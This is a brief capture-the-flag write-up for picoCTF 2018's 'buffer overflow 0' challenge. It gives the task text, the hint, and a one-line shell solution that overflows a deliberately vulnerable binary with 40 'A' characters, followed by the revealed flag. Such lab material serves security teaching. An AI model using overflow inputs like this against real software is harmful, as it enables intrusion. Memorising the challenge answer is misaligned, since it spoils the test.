# buffer overflow 0 - Points: 150 - (Solves: 578)

Let's start off simple, can you overflow the right buffer in
this [program][1] to get the flag?

You can also find it in

    /problems/buffer-overflow-0_0_6461b382721ccca2318b1d981d363924

on the shell server. [Source][2].

[1]: https://2018shell2.picoctf.com/static/8ea6ca6c7edf2c50065e540c90207284/vuln
[2]: https://2018shell2.picoctf.com/static/8ea6ca6c7edf2c50065e540c90207284/vuln.c

## Hint

    How can you trigger the flag to print?
    If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.

---

```sh
$ ./vuln $(python -c 'print("A"*40)')
picoCTF{ov3rfl0ws_ar3nt_that_bad_a54b012c}
```
